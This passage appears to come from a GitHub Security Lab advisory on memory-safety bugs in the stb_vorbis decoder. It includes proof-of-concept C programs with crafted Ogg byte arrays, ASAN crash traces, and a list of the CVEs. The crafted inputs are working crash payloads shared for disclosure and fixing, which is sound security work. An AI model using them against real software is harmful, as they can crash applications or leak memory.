                            0xb6,0xe4,0xb5,0x67,0x00,0x00,0x00,0x00,0x3b,0x21,0x03,0x0f,0x01,0x1e,
                            0x01,0x76,0x6f,0x72,0x62,0x69,0x73,0x00,0x00,0x00,0x00,0x01,0x44,0xac,
                            0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x38,0x01,0x00,0x00,0x00,0x00,0x00,
                            0xb8,0x01,0x4f,0x67,0x67,0x53,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x00,0x00,0xb6,0xe4,0xb5,0x67,0x01,0x00,0x00,0x00,0x83,0xb5,0x32,0x7b,
                            0x0e,0x63,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,
                            0x81,0x03,0x76,0x6f,0x72,0x62,0x69,0x73,0x2b,0x00,0x00,0x00,0x58,0x69,
                            0x70,0x68,0x2e,0x4f,0x72,0x67,0x20,0x6c,0x69,0x62,0x56,0x6f,0x72,0x62,
                            0x69,0x73,0x20,0x73,0xbe,0x61,0x97,0xcc,0x7c,0x55,0x7e,0xc6,0x03,0x1a,
                            0x85,0x7f,0x3d,0x39,0x3f,0x7f,0x8b,0xa9,0x41,0x21,0x11,0x14,0xf7,0x01,
                            0x00,0x00,0x20,0x00,0x00,0x00,0x00};
    size_t size = sizeof(data);

    int chan, samplerate;
    short *output;
    int samples = stb_vorbis_decode_memory(data, size, &chan, &samplerate, &output);
    if (samples >= 0)
        free(output);
    return 0;
}

```

1. Run the program to hit the error.

```
==359215==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000018 at pc 0x0000004e45b7 bp 0x7ffcdb4f8df0 sp 0x7ffcdb4f8de8
WRITE of size 8 at 0x602000000018 thread T0
    #0 0x4e45b6 in start_decoder(stb_vorbis*) tests/../stb_vorbis.c:3670:26
    #1 0x4f9444 in stb_vorbis_open_memory tests/../stb_vorbis.c:5112:8
    #2 0x4fbfb1 in stb_vorbis_decode_memory tests/../stb_vorbis.c:5390:20

```
### Issue 15: Wild address read in `vorbis_decode_packet_rest` (`GHSL-2023-172`)

A crafted file may trigger out of bounds read in [`DECODE`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3231) macro [when `var` is negative](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L1754-L1756) [1]

```
#define DECODE(var,f,c)                                       \
   DECODE_RAW(var,f,c)                                        \
   if (c->sparse) var = c->sorted_values[var]; // [1] OOB

```

As it can be seen in the definition of [`DECODE_RAW`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L1717-L1729) negative `var` is a valid value [2] and [3] (`codebook_decode_scalar_raw` may also return a negative value).

```
#define DECODE_RAW(var, f,c)                                  \
   if (f->valid_bits < STB_VORBIS_FAST_HUFFMAN_LENGTH)        \
      prep_huffman(f);                                        \
   var = f->acc & FAST_HUFFMAN_TABLE_MASK;                    \
   var = c->fast_huffman[var];                                \
   if (var >= 0) {                                            \
      int n = c->codeword_lengths[var];                       \
      f->acc >>= n;                                           \
      f->valid_bits -= n;                                     \
      if (f->valid_bits < 0) { f->valid_bits = 0; var = -1; } \ // [2]
   } else {                                                   \
      var = codebook_decode_scalar_raw(f,c);                  \ // [3]
   }

```
#### Impact

This issue may be used to leak internal memory allocation information.

#### Resources

To reproduce the issue:

1. Make ASAN build of the following program:

```
#include "../stb_vorbis.c"
#include <stdint.h>

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x4f,0x67,0x67,0x53,0x00,0x02,0x00,0x2b,0x00,0x00,0x00,0x00,0x00,0x00,0x39,0x30,0x00,0x00,
                            0x00,0x00,0x00,0x00,0xf1,0x49,0x93,0x48,0x01,0x1e,0x01,0x76,0x6f,0x72,0x62,0x69,0x73,0x00,
                            0x00,0x00,0x00,0x02,0x44,0xac,0x00,0x00,0xff,0xff,0xff,0xff,0x8f,0xb5,0x01,0x00,0xff,0xff,
                            0xff,0xff,0xb8,0x01,0x4f,0x67,0x67,0x53,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x39,0x30,0x00,0x00,0x01,0x00,0x00,0x00,0x65,0x9b,0x7d,0x94,0x0a,0x63,0xff,0xff,0xff,0xff,
                            0xff,0xff,0xff,0xff,0x3c,0x03,0x76,0x6f,0x72,0x62,0x69,0x73,0x20,0x00,0x00,0x00,0x58,0x6f,
                            0x7c,0x69,0x70,0x80,0x72,0x70,0x75,0x68,0x62,0x68,0xd4,0x75,0x6f,0x56,0x6f,0x72,0x62,0x69,
                            0x73,0x20,0x49,0x08,0x32,0x30,0x30,0x31,0x31,0x32,0x33,0x32,0x02,0x00,0x00,0x00,0x1c,0x00,
                            0x00,0x00,0x54,0x49,0x54,0x4c,0x45,0x3d,0x47,0x72,0x6f,0x6f,0x76,0x65,0x20,0x49,0x73,0x20,
                            0x49,0x6e,0x20,0x54,0x68,0x65,0xe9,0x48,0x65,0x61,0x72,0x74,0x0f,0x00,0x00,0x00,0x41,0x52,
                            0x54,0x49,0x53,0x54,0x3d,0x44,0x65,0x65,0x2d,0x6c,0x6d,0x74,0x65,0x01,0x05,0x76,0x6f,0x72,
                            0x62,0x69,0x73,0x22,0x42,0x43,0x56,0x01,0x00,0x40,0x00,0x00,0x06,0xc3,0xb2,0x2d,0x47,0xc4,
                            0x05,0x2c,0xc5,0xa3,0x6a,0x36,0x6c,0xc0,0xb4,0x01,0x00,0x00,0x00,0x10,0x1a,0xb2,0x0a,0x00,
                            0x00,0x02,0x00,0x30,0x38,0x92,0xa9,0x29,0x8e,0x29,0x5a,0x9a,0x0c,0x9a,0xa3,0xc9,0x9e,0xa4,
                            0xd9,0xa6,0x66,0x02,0xd1,0xf2,0x98,0x96,0x67,0xbb,0x9a,0x08,0xd8,0x2e,0x36,0x00,0x40,0x68,
                            0xc8,0x2a,0x00,0x00,0x10,0x00,0xc0,0x23,0x49,0x92,0x24,0x49,0x92,0x24,0x49,0x92,0x24,0x49,
                            0x96,0x64,0x49,0x96,0xa4,0x49,0x9a,0xa4,0x49,0x9a,0xa4,0x49,0x9e,0xe5,0x59,0xa2,0x25,0x5a,
                            0xa2,0x65,0x5a,0xa6,0x66,0x6a,0xaa,0xa6,0x6a,0xaa,0x27,0x7b,0xae,0xe7,0x8a,0xb2,0xe8,0x9a,
                            0xba,0xa9,0xab,0x54,0xaa,0xee,0xda,0x36,0x9b,0x6c,0xeb,0x6c,0x5b,0x07,0x9d,0x0e,0x40,0x07,
                            0x00,0x00,0x00,0x08,0x0d,0x59,0x05,0x00,0x64,0x00,0x00,0xe8,0x38,0x8e,0xe3,0x48,0x8a,0xa4,
                            0x48,0x8e,0xe4,0x48,0x92,0x64,0x59,0x96,0xa5,0x69,0x9a,0x06,0x84,0x86,0xac,0x02,0x00,0x64,
                            0x00,0x00,0x04,0x00,0x00,0x50,0x0c,0x45,0x71,0x14,0xc9,0x91,0x24,0xcf,0xf3,0x34,0xcf,0xe3,
                            0x01,0x80,0xd0,0x90,0x55,0x00,0x00,0x20,0x00,0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x84,0x86,0xac,0x02,0x00,0x24,0x00,0x00,0x74,
                            0x1c,0xc7,0x71,0x24,0x45,0x72,0x1c,0xc7,0x71,0x1c,0x47,0x92,0x80,0xd0,0x90,0x55,0x00,0x80,
                            0x0c,0x00,0x80,0x00,0x00,0x14,0x45,0x71,0x1c,0xc7,0x71,0x24,0x49,0x92,0x24,0x4b,0xb2,0x2c,
                            0xcd,0xd2,0x34,0x4f,0xf3,0x34,0xd1,0x33,0x4d,0x4f,0x14,0x81,0xd0,0x90,0x55,0x00,0x00,0x20,
                            0x00,0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x2c,0x83,0xe2,0x38,0x0e,0xc7,0x91,0x1c,0x4b,0x22,
                            0x49,0x92,0x84,0x05,0x00,0x00,0xb0,0x00,0x00,0x00,0x00,0x80,0xd0,0x90,0x55,0x00,0x00,0x02,
                            0x00,0x00,0x20,0x8c,0x22,0x88,0x31,0x20,0x34,0x64,0x15,0x00,0x00,0x01,0x00,0x60,0x70,0x14,
                            0x92,0x26,0x32,0x3c,0x91,0x05,0x20,0x34,0x64,0x15,0x00,0x00,0x04,0x00,0x60,0x30,0x2c,0xa2,
                            0x24,0x32,0x35,0x11,0x68,0x8a,0x45,0x94,0x44,0xb6,0xaa,0x02,0x59,0x74,0xc9,0xa6,0x4b,0x97,
                            0x75,0x00,0x00,0x00,0x84,0x86,0xac,0x02,0x00,0x80,0x00,0x00,0x0c,0x8a,0x24,0x6b,0x8e,0x65,
                            0x8a,0x9a,0xe9,0x83,0xa5,0x68,0xbe,0x26,0x79,0x3c,0x49,0x05,0xae,0x67,0x72,0x35,0x55,0x57,
                            0x3d,0x55,0x07,0x6c,0x74,0x5b,0x06,0x00,0x42,0x43,0x56,0x01,0x00,0x20,0x00,0x00,0x07,0xb2,
                            0xce,0x20,0x34,0x64,0x15,0x00,0x00,0x08,0x00,0x20,0x00,0x00,0x00,0x40,0x51,0x1c,0xc5,0x71,
                            0x24,0x47,0x72,0x24,0xc9,0x92,0x2c,0xc9,0xb2,0x2c,0x4d,0xd3,0x3c,0x4f,0x14,0x45,0xd1,0x33,
                            0x45,0x98,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08,0x0d,0x59,0x05,0x00,0x80,0x00,0x00,
                            0x10,0xc6,0x18,0x63,0x10,0x42,0x08,0x21,0xa4,0x90,0x42,0x0c,0x31,0xe5,0x94,0x53,0x90,0x49,
                            0x46,0x1d,0x05,0x42,0x43,0x56,0x01,0x00,0x80,0x00,0x00,0x02,0x00,0x00,0x00,0x0c,0x4b,0xb1,
                            0x14,0x4f,0xf1,0x1c,0xcf,0x51,0x1d,0x53,0x22,0xa9,0x12,0x4b,0xd5,0x78,0x34,0x1e,0x8f,0xc8,
                            0xa4,0x32,0x81,0x09,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x34,0x64,0x15,0x00,0x20,0x01,0x00,
                            0xa0,0x23,0x39,0x92,0x23,0x29,0x92,0xe2,0x28,0x8e,0x23,0x49,0x92,0x04,0x84,0x86,0xac,0x02,
                            0xff,0x64,0x00,0x00,0x04,0x00,0x60,0x38,0x8a,0xa4,0x48,0x8a,0xa5,0x68,0x8e,0x67,0x79,0x9a,
                            0x68,0x9a,0xa6,0xab,0xaa,0xaa,0x2b,0xbb,0x64,0x17,0x17,0x08,0x0d,0x59,0x05,0x00,0x00,0x02,
                            0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x42,0x43,0x56,0x01,0xff,0x12,0x00,0x00,0x3a,0x8e,0xe3,0x38,0x8e,0xe3,0x38,0x8e,0xe3,0x38,
                            0x8e,0xe4,0x48,0x40,0x68,0xc8,0x2a,0x00,0x40,0x06,0x00,0x40,0x00,0x00,0x86,0x63,0x38,0x8a,
                            0xe5,0x68,0x92,0x27,0x79,0x96,0x67,0x79,0x9a,0xa7,0x79,0x9e,0xe7,0x79,0x9e,0x28,0x9a,0xa2,
                            0x29,0x8a,0x40,0x68,0xc8,0x2a,0x00,0x00,0x10,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x8a,
                            0xa3,0x38,0x8e,0xe3,0x48,0x92,0xe4,0xb0,0x48,0x96,0x23,0x49,0x16,0x8b,0x24,0x01,0x00,0x00,
                            0x00,0x00,0x00,0x00,0x20,0x34,0x64,0x25,0x00,0x00,0x04,0x00,0x60,0x01,0x57,0x95,0x79,0x9e,
                            0x08,0x2c,0xc7,0x32,0x41,0x93,0x2c,0x13,0x44,0x4d,0x13,0x21,0x81,0xe3,0x98,0x0a,0x28,0x8a,
                            0x27,0x7a,0x8e,0x63,0x79,0x9a,0x0c,0x84,0x86,0xac,0x08,0x00,0xe2,0x04,0x00,0x0c,0x8e,0x03,
                            0xcd,0x82,0x65,0xc1,0x75,0x01,0x8e,0x65,0x41,0xf4,0xe0,0x89,0xd0,0x65,0x80,0x63,0x59,0xf0,
                            0x44,0x88,0x1e,0x64,0x1b,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xcd,0x13,0x21,
                            0x8a,0x10,0x4d,0xd8,0x32,0xc0,0x12,0x3d,0x88,0x22,0x4c,0x11,0xae,0x0d,0x00,0x00,0x00,0x00,
                            0x00,0x00,0x00,0x00,0x00,0x80,0x25,0x7a,0x30,0x45,0x88,0x22,0x64,0x19,0x60,0x79,0x22,0x44,
                            0x13,0xa2,0x08,0x59,0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x95,0x6d,0xc8,
                            0x36,0x64,0x19,0xba,0x0e,0x70,0x75,0x19,0xb2,0x0c,0x59,0x86,0xae,0x03,0x00,0x00,0x00,0x00,
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x02,0x00,0x00,0x07,0xdb,0xff,0x00,0x02,0x4c,0x28,0x03,0x85,0x86,0xac,0x04,0x00,0xa2,0x00,
                            0x00,0x0c,0x8a,0x22,0x49,0x40,0x92,0x34,0x0b,0x48,0x92,0xa5,0x01,0xcf,0x13,0x45,0x80,0x29,
                            0x02,0x64,0x17,0xe0,0xba,0x00,0xdb,0x06,0x00,0x02,0x00,0x00,0x09,0xea,0x64,0xb8,0x02,0x6c,
                            0xd0,0x94,0x58,0x1c,0xa0,0xd0,0x90,0x95,0x00,0x40,0x48,0x00,0x80,0x43,0x51,0x24,0xc9,0xb2,
                            0x3c,0x0f,0x80,0xe3,0x58,0x96,0xa6,0x79,0x22,0x00,0xc7,0xb1,0x2c,0x4d,0x13,0x3d,0x00,0x9e,
                            0xe7,0x79,0xa2,0x68,0x9a,0x00,0xf0,0x3c,0x51,0x34,0x4d,0x00,0xa8,0xaa,0xaa,0xaa,0x2a,0x00,
                            0x54,0xd5,0x54,0x55,0x15,0x00,0xb2,0x2c,0xcb,0xb6,0x0c,0x00,0x64,0x59,0x96,0x01,0x80,0xae,
                            0xfb,0x3a,0x00,0xb0,0x75,0x5f,0x07,0x00,0xc2,0x30,0x1c,0x01,0x00,0x61,0x08,0x00,0x18,0x4b,
                            0x00,0xc0,0x58,0x02,0x00,0xc6,0x11,0x00,0x00,0x40,0x00,0x00,0xc0,0x81,0x03,0x00,0x40,0x80,
                            0x11,0x87,0x92,0x51,0x65,0x11,0x30,0x9a,0x70,0xe1,0x01,0x28,0x34,0x64,0x25,0x00,0x10,0x0e,
                            0x00,0x60,0x50,0x0c,0xcb,0xf2,0x3c,0x55,0x05,0xd5,0x4b,0xf3,0x3c,0xd3,0x94,0x65,0xc0,0xd3,
                            0x2c,0xcf,0x33,0x4d,0xd9,0x05,0xa8,0xae,0xaa,0xba,0xaa,0xad,0x03,0x5c,0xd3,0x75,0x65,0x59,
                            0xd7,0x01,0xb6,0xf0,0xea,0xb6,0xae,0xfb,0x00,0xb6,0xee,0xea,0xba,0x31,0x04,0x90,0x85,0x5d,
                            0x58,0x02,0x50,0x5e,0x63,0x27,0x04,0x10,0xda,0xca,0x12,0x00,0x5d,0x99,0x19,0x01,0xf0,0x29,
                            0x01,0xc0,0x26,0x04,0xc0,0x68,0x04,0x00,0x84,0x40,0x00,0x00,0xe6,0x82,0x00,0x00,0x70,0x81,
                            0xcd,0x31,0xac,0x24,0x9d,0x15,0x8e,0x06,0x17,0x1a,0xb2,0x12,0x00,0x88,0x01,0x00,0x20,0x0c,
                            0x41,0x08,0x21,0x87,0x90,0x42,0x4a,0x31,0x84,0x90,0x52,0xca,0x31,0xc6,0x18,0x63,0xce,0x39,
                            0xc6,0x18,0x83,0x10,0x3a,0xe7,0x1c,0x84,0x90,0x31,0xe7,0x04,0x00,0x00,0x0e,0x38,0x00,0x00,
                            0x04,0x98,0x98,0x98,0xc2,0x42,0x43,0x56,0x04,0x00,0x51,0x00,0x00,0x06,0x45,0x01,0x1c,0x49,
                            0x02,0x1c,0x49,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x01,0x0e,0x00,0x00,
                            0x01,0x16,0x42,0xa1,0x21,0x2b,0x01,0x80,0x28,0x00,0x00,0x83,0x62,0x48,0x8e,0x66,0x79,0x1e,
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x00,0x80,0x02,0x07,0x00,0x80,0x00,0x1b,
                            0x31,0x25,0x24,0x07,0x28,0x34,0x64,0x25,0x00,0x90,0x0a,0x00,0x60,0x50,0x0c,0xcb,0x72,0x55,
                            0x40,0xb3,0x3c,0xcf,0x24,0x03,0x9a,0x27,0x89,0x1a,0x19,0x20,0x52,0xc9,0x00,0x44,0xd7,0x04,
                            0xe0,0x52,0xc9,0x00,0x64,0x26,0x00,0x00,0x00,0x19,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,
                            0x00,0x48,0xb9,0xca,0xff,0xcd,0x32,0xd9,0xb0,0x3a,0xc2,0x49,0xd1,0x58,0x60,0xa1,0x21,0x2b,
                            0x01,0x80,0x08,0x01,0x00,0x87,0xa2,0x48,0x92,0x65,0x69,0x9a,0xe6,0x79,0x9e,0xe7,0x89,0x9e,
                            0xe7,0x79,0x9e,0x28,0x6a,0x96,0xa5,0x69,0x9a,0xe7,0x79,0x9e,0x28,0x8a,0xa2,0x69,0x8a,0xa2,
                            0x28,0x8a,0xa6,0x29,0x5b,0x96,0xa6,0x79,0x9e,0xe7,0x89,0x9e,0x28,0x8a,0xa2,0x28,0x8a,0xa2,
                            0x28,0x9a,0xa6,0x2d,0x8a,0x9e,0x28,0x8a,0xa2,0x69,0x9a,0xa6,0x69,0x9a,0xa6,0x6a,0x9a,0xa6,
                            0xa9,0xaa,0xb2,0x29,0x8a,0x9e,0x28,0x9a,0xa2,0x29,0x9a,0xa6,0x69,0x9a,0xa6,0x69,0x9a,0xa6,
                            0x69,0xca,0xaa,0x2c,0x9a,0xa6,0x69,0xaa,0xa6,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,
                            0x6a,0xcb,0xb6,0x29,0xaa,0xa6,0x6a,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xba,0xaa,
                            0xad,0xdb,0xaa,0xab,0xaa,0xaa,0xab,0xaa,0xaa,0xab,0xba,0xaa,0xaa,0xaa,0xaa,0xea,0xba,0xb6,
                            0x6d,0xbb,0xa6,0x6a,0xaa,0xa6,0xab,0xba,0xae,0xea,0xba,0xae,0xaa,0xaa,0xaa,0xeb,0xda,0xb6,
                            0xed,0xca,0xa6,0xac,0xba,0xae,0xeb,0xba,0xae,0xeb,0xba,0xae,0xaa,0xba,0xae,0x2c,0xcb,0xb6,
                            0x2c,0xbb,0xa6,0xab,0xba,0xae,0xeb,0xba,0xae,0xeb,0xba,0xae,0xeb,0xba,0xae,0x6e,0xeb,0xb2,
                            0xad,0xca,0xae,0xec,0xba,0xb2,0x2b,0xcb,0xb2,0xeb,0xba,0xb2,0x2b,0xcb,0xb2,0x2c,0xcb,0x5c,
                            0xd5,0x55,0x5d,0xd7,0x75,0x5d,0xd7,0x95,0x65,0xdb,0x75,0x65,0xd9,0x96,0x6d,0xdb,0x96,0x65,
                            0xd7,0x76,0x5d,0x57,0x96,0x5d,0x59,0x96,0x5d,0xd7,0x95,0x5d,0x59,0xd7,0x6d,0x5d,0xb6,0x6d,
                            0x55,0x96,0x65,0x59,0x76,0x65,0x59,0x76,0x5d,0x59,0x96,0x6d,0xdf,0xb6,0x65,0xdb,0x76,0x65,
                            0x59,0x96,0x6d,0x59,0x96,0x65,0x59,0x96,0x5d,0x59,0xf6,0x75,0xd9,0xd6,0x6d,0x5b,0x76,0x65,
                            0x57,0x76,0x65,0x59,0x96,0x65,0x57,0xb6,0x65,0x59,0xb7,0x65,0xdb,0xb6,0x6d,0x5d,0x76,0x6d,
                            0x57,0xb6,0x65,0x5b,0x96,0x65,0x57,0x96,0x65,0x5b,0xb6,0x6d,0xdb,0xb6,0x6d,0x5b,0x96,0x6d,
                            0x59,0x76,0x65,0x5d,0x96,0x65,0xd9,0xb6,0x6d,0xdf,0xb6,0x6d,0xdf,0xd6,0x6d,0x5b,0x96,0x5d,
                            0x59,0x96,0x65,0x59,0x96,0x6d,0xdb,0xb6,0x6d,0x5b,0xd6,0x6d,0xdb,0xb6,0x75,0xd9,0x96,0x5d,
                            0xd9,0x96,0x6d,0x59,0x96,0x6d,0x5b,0xb7,0x75,0x5d,0xb7,0x6d,0xdb,0xb7,0x75,0x59,0x97,0x5d,
                            0xdb,0xb6,0x6d,0x59,0xd6,0x75,0x9b,0x6e,0xeb,0xba,0xed,0xd3,0x75,0x5b,0x96,0x65,0x5b,0x96,
                            0x6d,0x5d,0xb6,0x75,0x01,0x00,0x08,0x0b,0x0e,0x00,0x80,0x83,0x46,0x96,0x62,0xa9,0x21,0x77,
                            0x9e,0x81,0x25,0x12,0x33,0xa6,0xa0,0xa1,0x02,0x2b,0x34,0x64,0x45,0x00,0x10,0x05,0x00,0xc0,
                            0x20,0xc4,0x94,0x62,0x4a,0x21,0x84,0x98,0x52,0x4c,0x31,0x84,0x10,0x53,0x8a,0x29,0xc5,0x18,
                            0x63,0x8c,0x31,0xc6,0x18,0x63,0x8c,0x31,0xc6,0x98,0x52,0x8c,0x31,0xc6,0x18,0x63,0x8c,0x31,
                            0xc6,0x18,0x63,0x4a,0x29,0xc6,0x18,0x63,0x8c,0x31,0xc6,0x18,0x63,0x8c,0x09,0x00,0x00,0x07,
                            0x70,0x00,0x00,0x08,0xb0,0x10,0x0a,0x0d,0x59,0x09,0x00,0x00,0x01,0x00,0x58,0x4c,0xd7,0xf6,
                            0x35,0xd1,0x17,0x15,0xc7,0xf2,0x24,0xcf,0x77,0x1d,0x47,0xd2,0x3c,0x51,0xb8,0x2d,0x49,0xb2,
                            0x5c,0x97,0xef,0x59,0x92,0xa3,0xeb,0xa2,0x06,0x8a,0x64,0x7b,0x20,0x49,0xb2,0x2f,0xec,0xb2,
                            0x26,0xbb,0x26,0x00,0x00,0x00,0x82,0x00,0x00,0x03,0x11,0x21,0x31,0x06,0x24,0x02,0x00,0x41,
                            0x81,0x81,0x0c,0x00,0x31,0x40,0x48,0xe8,0x0c,0x11,0x8f,0x4e,0xe8,0xdf,0x2c,0xf9,0x71,0xf4,
                            0xd7,0x9b,0xc1,0xc5,0xa8,0x1a,0x73,0x00,0x80,0x82,0x10,0x11,0x91,0x99,0x51,0x10,0x1a,0x0f,
                            0x4b,0x43,0x22,0x42,0x6e,0x00,0x48,0x4c,0x50,0x48,0x06,0x8b,0x0f,0x80,0x8b,0x14,0xcb,0xc2,
                            0x27,0x71,0xc0,0xda,0xba,0x88,0xde,0x04,0xe2,0x1c,0x31,0xff,0xc8,0xd3,0x5b,0x1e,0x90,0x00,
                            0x05,0x40,0x88,0x63,0x80,0x02,0xc2,0x8d,0xda,0x9a,0x65,0xfe,0x37,0x1a,0xf3,0xd4,0x14,0x73,
                            0x0f,0x00,0x00,0x04,0x00,0x00,0xa0,0x9a,0x1e,0x00,0x00,0x00,0x8e,0x0d,0x20,0xa2,0x21,0x3a,
                            0x8c,0x0c,0x8d,0x0d,0x8e,0x10,0x90,0x8f,0x0e,0x0e,0x00,0x00,0x01,0x00,0x00,0x03,0x40,0x87,
                            0xf0,0x00,0x80,0x43,0x04,0x88,0x68,0x88,0x0e,0x23,0x43,0x63,0x83,0xa3,0xc3,0xe3,0x03,0x24,
                            0x24,0x00,0x00,0x10,0x40,0x00,0x02,0x00,0x00,0x00,0x04,0x10,0x80,0x80,0x80,0x00,0x00,0x00,
                            0x00,0x00,0x40,0x00,0x00,0x00,0x80,0x80,0x4f,0x67,0x67,0x53,0x00,0x00,0xc0,0x2e,0x00,0x00,
                            0x00,0x00,0x00,0x00,0x39,0x30,0x00,0x00,0x02,0x00,0x73,0xdc,0x00,0xcd,0x27,0x00,0x05,0x01,
                            0x0d,0x01,0x00,0x00,0x03,0x66,0xba,0x01,0x1e,0x38,0x89,0x8d,0x06,0xfc,0x00,0xd1,0x00,0x2e,
                            0xb3};
    size_t size = sizeof(data);

    int chan, samplerate;
    short *output;
    int samples = stb_vorbis_decode_memory(data, size, &chan, &samplerate, &output);
    if (samples >= 0)
        free(output);
    return 0;
}

```

1. Run the program to hit the error.

```
AddressSanitizer:DEADLYSIGNAL
=================================================================
==241158==ERROR: AddressSanitizer: SEGV on unknown address (pc 0x0000005001e0 bp 0x7ffc7060a860 sp 0x7ffc70608e40 T0)
==241158==The signal is caused by a READ memory access.
    #0 0x5001e0 in vorbis_decode_packet_rest(stb_vorbis*, int*, Mode*, int, int, int, int, int*) tests/../stb_vorbis.c:3231:22
    #1 0x4e1480 in vorbis_decode_packet(stb_vorbis*, int*, int*, int*) tests/../stb_vorbis.c:3453:11
    #2 0x4f4628 in vorbis_pump_first_frame(stb_vorbis*) tests/../stb_vorbis.c:3512:10
    #3 0x4f94b6 in stb_vorbis_open_memory tests/../stb_vorbis.c:5116:10
    #4 0x4fbfb1 in stb_vorbis_decode_memory tests/../stb_vorbis.c:5390:20

```
## CVE

* GHSL-2023-145 - CVE-2023-45661
* GHSL-2023-146 - CVE-2023-45662
* GHSL-2023-147 - CVE-2023-45663
* GHSL-2023-148 - CVE-2023-45664
* GHSL-2023-150 - CVE-2023-45666
* GHSL-2023-151 - CVE-2023-45667
* GHSL-2023-165 - CVE-2023-45675
* GHSL-2023-166 - CVE-2023-45676
* GHSL-2023-167 - CVE-2023-45677
* GHSL-2023-168 - CVE-2023-45678
* GHSL-2023-169 - CVE-2023-45679
* GHSL-2023-170 - CVE-2023-45680
* GHSL-2023-171 - CVE-2023-45681
* GHSL-2023-172 - CVE-2023-45682

## Credit

These issues were discovered and reported by GHSL team member [@JarLob (Jaroslav Lobačevski)](https://github.com/JarLob).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2023-145`, `GHSL-2023-146`, `GHSL-2023-147`, `GHSL-2023-148`, `GHSL-2023-149`, `GHSL-2023-150`, `GHSL-2023-151`, `GHSL-2023-165`, `GHSL-2023-166`, `GHSL-2023-167`, `GHSL-2023-168`, `GHSL-2023-169`, `GHSL-2023-170`, `GHSL-2023-171` or `GHSL-2023-172` in any communication regarding these issues.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information



=== Content from github.com_3d27c7f6_20250111_100627.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnothings%2Fstb%2Fblob%2F5736b15f7ea0ffb08dd38af21067c314d6a3aae9%2Fstb_image.h)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
